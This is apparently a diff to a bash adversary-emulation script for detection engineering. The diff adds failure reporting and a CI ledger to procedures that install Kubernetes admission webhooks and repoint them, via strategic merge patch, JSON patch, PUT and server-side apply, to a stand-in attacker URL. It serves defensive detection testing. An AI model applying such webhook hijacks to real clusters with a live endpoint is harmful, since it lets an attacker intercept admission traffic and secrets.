@@ -39,6 +39,53 @@ EVIL_URL="https://trr9025.poison.example.invalid/callback"
 
 log() { printf '[trr9025] %s\n' "$*" >&2; }
 
+# ---- fail-loud procedure bookkeeping (C1-4) --------------------------------
+# `must CMD` runs a procedure's action and returns its exit code (stderr shown on
+# failure); `apply_stdin ARGS` is `must kubectl ARGS -f -` for a body on stdin, from a
+# heredoc or from a producer piped into it (pipefail is on, so the pipeline reports the
+# write's exit), and it shows the API server's reason when the write is refused.
+# `run_proc P` times procedure_P, appends one ledger line to $DETENG_LEDGER (set by CI;
+# unset = no ledger) and records a failure without stopping the run, so `all` attempts
+# every procedure and then exits 1 naming the failures. Cleanup and the read-only gap
+# print keep `|| true`.
+TRR="TRR9025"
+FAILED=()
+now_utc() { date -u +%Y-%m-%dT%H:%M:%S.%6NZ; }
+must() {
+  local out rc=0
+  out="$("$@" 2>&1 >/dev/null)" || rc=$?
+  if [ "$rc" -ne 0 ]; then
+    log "FAILED (exit $rc): $*"
+    [ -n "$out" ] && printf '%s\n' "$out" | sed 's/^/    /' >&2
+  fi
+  return "$rc"
+}
+apply_stdin() {
+  local out rc=0
+  out="$(kubectl "$@" -f - 2>&1 >/dev/null)" || rc=$?
+  if [ "$rc" -ne 0 ]; then
+    log "FAILED (exit $rc): kubectl $* -f - (stdin)"
+    [ -n "$out" ] && printf '%s\n' "$out" | sed 's/^/    /' >&2
+  fi
+  return "$rc"
+}
+run_proc() {
+  local p="$1" start end rc=0
+  start="$(now_utc)"
+  "procedure_$p" || rc=$?
+  end="$(now_utc)"
+  if [ -n "${DETENG_LEDGER:-}" ]; then
+    printf '{"trr":"%s","procedure":"%s","start":"%s","end":"%s","exit":%d,"expect":0}\n' \
+      "$TRR" "$p" "$start" "$end" "$rc" >> "$DETENG_LEDGER"
+  fi
+  if [ "$rc" -ne 0 ]; then
+    FAILED+=("$p")
+    [ -n "${GITHUB_ACTIONS:-}" ] && \
+      echo "::error title=${TRR} procedure ${p}::procedure ${p} failed (exit ${rc})"
+  fi
+  return 0
+}
+
 cleanup() {
   log "cleanup: removing every trr9025- admission object"
   kubectl delete mutatingwebhookconfiguration trr9025-mwc --ignore-not-found >/dev/null 2>&1 || true
@@ -54,7 +101,7 @@ cleanup() {
 # graded) and the URL the grader keys on.
 procedure_a() {
   log "A: create mutatingwebhookconfiguration trr9025-mwc (off-cluster URL, rules */*; no-op)"
-  kubectl apply -f - >/dev/null 2>&1 <<EOF || true
+  apply_stdin apply <<EOF
 apiVersion: admissionregistration.k8s.io/v1
 kind: MutatingWebhookConfiguration
 metadata:
@@ -82,7 +129,7 @@ EOF
 # URL. objectSelector prevents it from ever intercepting a real Secret.
 procedure_b() {
   log "B: create validatingwebhookconfiguration trr9025-vwc (off-cluster URL, resources: secrets; no-op)"
-  kubectl apply -f - >/dev/null 2>&1 <<EOF || true
+  apply_stdin apply <<EOF
 apiVersion: admissionregistration.k8s.io/v1
 kind: ValidatingWebhookConfiguration
 metadata:
@@ -111,7 +158,7 @@ EOF
 # does nothing even if created.
 procedure_c() {
   log "C: create validatingadmissionpolicy trr9025-vap (CEL always-allow; chokepoint only)"
-  kubectl apply -f - >/dev/null 2>&1 <<'EOF' || true
+  apply_stdin apply <<'EOF'
 apiVersion: admissionregistration.k8s.io/v1
 kind: ValidatingAdmissionPolicy
 metadata:
@@ -185,36 +232,40 @@ EOF
 # --server-side`. The object does not exist, so the API server creates it with a PATCH
 # answered 201 (K21): this proves the server-side-apply install path the two create
 # rules match (verb patch, responseStatus.code 201), not a repoint.
+# Every write here is a gate-matched record (the four repoints, the SSA install), so a
+# refused write FAILS the procedure (pipefail makes a producer|kubectl pipeline report
+# the write's exit, and apply_stdin prints the refusal); nothing is swallowed.
 procedure_d() {
-  local n
+  local n rc=0
   for n in smp json put; do
-    _hijack_vwc "trr9025-hijack-$n" | kubectl apply -f - >/dev/null \
-      || log "D: install of trr9025-hijack-$n failed (see the error above)"
+    _hijack_vwc "trr9025-hijack-$n" | apply_stdin apply \
+      || { log "D: install of trr9025-hijack-$n failed"; rc=1; }
   done
-  _hijack_vwc trr9025-hijack-ssa | kubectl apply --server-side --force-conflicts -f - >/dev/null \
-    || log "D: install of trr9025-hijack-ssa failed (see the error above)"
+  _hijack_vwc trr9025-hijack-ssa | apply_stdin apply --server-side --force-conflicts \
+    || { log "D: install of trr9025-hijack-ssa failed"; rc=1; }
   log "D: strategic merge patch trr9025-hijack-smp: service -> url"
-  kubectl patch validatingwebhookconfiguration trr9025-hijack-smp \
+  must kubectl patch validatingwebhookconfiguration trr9025-hijack-smp \
     -p "{\"webhooks\":[{\"name\":\"w.trr9025.example.com\",\"clientConfig\":{\"service\":null,\"url\":\"${EVIL_URL}\"}}]}" \
-    >/dev/null || log "D: strategic merge patch refused (see the error above)"
+    || rc=1
   log "D: JSON patch trr9025-hijack-json: remove service, add url"
-  kubectl patch validatingwebhookconfiguration trr9025-hijack-json --type=json \
+  must kubectl patch validatingwebhookconfiguration trr9025-hijack-json --type=json \
     -p "[{\"op\":\"remove\",\"path\":\"/webhooks/0/clientConfig/service\"},{\"op\":\"add\",\"path\":\"/webhooks/0/clientConfig/url\",\"value\":\"${EVIL_URL}\"}]" \
-    >/dev/null || log "D: JSON patch refused (see the error above)"
+    || rc=1
   log "D: kubectl replace (PUT) trr9025-hijack-put with url"
   local rv
   rv="$(kubectl get validatingwebhookconfiguration trr9025-hijack-put \
     -o jsonpath='{.metadata.resourceVersion}' 2>/dev/null || true)"
-  _hijack_vwc trr9025-hijack-put "$EVIL_URL" "$rv" | kubectl replace -f - >/dev/null \
-    || log "D: kubectl replace (PUT) refused (see the error above)"
+  _hijack_vwc trr9025-hijack-put "$EVIL_URL" "$rv" | apply_stdin replace \
+    || { log "D: kubectl replace (PUT) refused"; rc=1; }
   log "D: server-side apply trr9025-hijack-ssa with url (repoint, answered 200)"
   _hijack_vwc trr9025-hijack-ssa "$EVIL_URL" \
-    | kubectl apply --server-side --force-conflicts -f - >/dev/null \
-    || log "D: server-side apply repoint refused (see the error above)"
+    | apply_stdin apply --server-side --force-conflicts \
+    || { log "D: server-side apply repoint refused"; rc=1; }
   log "D: server-side apply install of a NEW url-mode webhook trr9025-ssa-create (create via PATCH, answered 201; K21)"
   _hijack_vwc trr9025-ssa-create "$EVIL_URL" \
-    | kubectl apply --server-side -f - >/dev/null \
-    || log "D: server-side apply install refused (see the error above)"
+    | apply_stdin apply --server-side \
+    || { log "D: server-side apply install refused"; rc=1; }
+  return "$rc"
 }
 
 # Gap — the control-plane bypass. An adversary with control-plane node / etcd access can
@@ -236,11 +287,7 @@ procedure_gap() {
 
 run_one() {
   case "$1" in
-    a) procedure_a ;;
-    b) procedure_b ;;
-    c) procedure_c ;;
-    d) procedure_d ;;
-    gap) procedure_gap ;;
+    a|b|c|d|gap) run_proc "$1" ;;
     *) log "unknown item: $1 (use a|b|c|d|gap|all)"; exit 2 ;;
   esac
 }
@@ -248,10 +295,14 @@ run_one() {
 main() {
   local which="${1:-all}"
   if [ "$which" = "all" ]; then
-    for p in a b c d gap; do run_one "$p"; done
+    for p in a b c d gap; do run_proc "$p"; done
     cleanup
   else
     run_one "$which"
+  fi
+  if [ "${#FAILED[@]}" -gt 0 ]; then
+    log "emulation FAILED: procedure(s) ${FAILED[*]}"
+    exit 1
   fi
   log "emulation complete: $which"
 }
